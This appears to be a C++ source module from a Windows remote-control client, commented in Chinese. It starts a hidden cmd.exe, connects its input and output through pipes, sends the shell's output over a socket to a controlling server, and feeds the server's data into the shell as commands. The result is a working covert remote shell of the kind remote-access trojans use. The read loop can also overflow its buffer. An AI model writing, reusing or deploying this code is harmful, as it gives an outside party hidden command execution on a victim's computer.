#include "stdafx.h"
#include "Client.h"
extern SOCKET sClient;
extern HANDLE hMyCmdWrite;
bool CmdThread()
{
    HANDLE hCmdRead;

    HANDLE hCmdWrite;
    HANDLE hMyCmdRead;
    DWORD dwReadedBytes = 0;

    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;

    char szInput[256] = { 0 };
    char szReadBuf[260] = { 0 };

    //创建一个匿名管道
    BOOL bRet = CreatePipe(&hCmdRead,
        &hMyCmdWrite,
        &sa,
        0);

    bRet = CreatePipe(&hMyCmdRead,
        &hCmdWrite,
        &sa,
        0);


    char szCmdline[256] = { 0 };
    strcpy_s(szCmdline, 256, "cmd.exe");

    STARTUPINFOA si = { 0 };
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = hCmdRead;
    si.hStdOutput = hCmdWrite;
    si.hStdError = hCmdWrite;


    PROCESS_INFORMATION pi;

    bRet = CreateProcessA(NULL,
        szCmdline,
        NULL,
        NULL,
        TRUE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi);

    if (!bRet)
    {
        return false;
    }

    //发送命令，告诉服务器已经成功创建了cmd
    tagPacket pkt;
    pkt.ucode = CLIENT_CMD_REPLY;
    pkt.nLength = 0;
    send(sClient,
        (char*)&pkt,
        sizeof(tagPacket),
        0);

    while (true)
    {
        DWORD dwBytesRead = 0;            // number of bytes read
        DWORD dwTotalBytesAvail = 0;      // number of bytes available
        DWORD dwBytesLeftThisMessage = 0;  // unread bytes
        int nRet;

        memset(szReadBuf, 0, 255);
        tagPacket* pkt = (tagPacket*)szReadBuf;
        pkt->ucode = CLIENT_CMD_DATA;


        bRet = ReadFile(hMyCmdRead,
            szReadBuf + sizeof(tagPacket),
            255,
            &dwReadedBytes,
            NULL);

        if (bRet && dwReadedBytes > 0) 
        {
            pkt->nLength = dwReadedBytes;

            nRet = send(sClient,
                szReadBuf,
                sizeof(tagPacket) + pkt->nLength,
                0);
        }
    }
}

void OnServerCmd(SOCKET s, char* pData, int nLength) 
{
    //创建一个用于cmd通信的线程
    std::thread* pThd = new std::thread(CmdThread);

    //通知服务端cmd创建完成了。
}

void OnServerCmdData(SOCKET s, char* pData, int nLength)
{
    DWORD dwWriteBytes = 0;
    WriteFile(hMyCmdWrite, pData, nLength, &dwWriteBytes, NULL);
}